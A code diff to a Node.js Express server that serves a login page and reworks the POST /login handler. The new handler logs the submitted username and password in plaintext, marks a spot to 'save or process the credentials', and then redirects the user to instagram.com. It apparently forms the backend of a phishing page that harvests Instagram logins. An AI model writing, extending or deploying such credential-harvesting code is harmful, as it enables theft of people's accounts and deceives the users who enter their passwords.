@@ -15,13 +15,21 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/public/login.html');  // Adjust if needed
 });
 
-// Handle form submission (if needed for server-side logic)
+// Handle form submission
 app.post('/login', (req, res) => {
+    // Log the entire body to see if we are capturing the data
+    console.log('Form data received:', req.body);
+
     const { username, password } = req.body;
-    console.log(`Received login request with username: ${username} and password: ${password}`);
-    
-    // Redirect to the desired URL after login (this could be dynamic)
-    res.redirect('https://www.instagram.com'); // Change this URL to your desired destination
+    if (username && password) {
+        console.log(`Received login request with username: ${username} and password: ${password}`);
+    } else {
+        console.log('Username or password is missing!');
+    }
+
+    // You can save or process the credentials here
+    // For demonstration purposes, we will redirect to Instagram
+    res.redirect('https://www.instagram.com'); // Redirect to desired destination
 });
 
 // Start the server
